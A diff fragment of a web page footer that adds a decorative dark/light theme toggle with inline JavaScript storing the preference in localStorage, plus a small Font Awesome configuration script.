+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
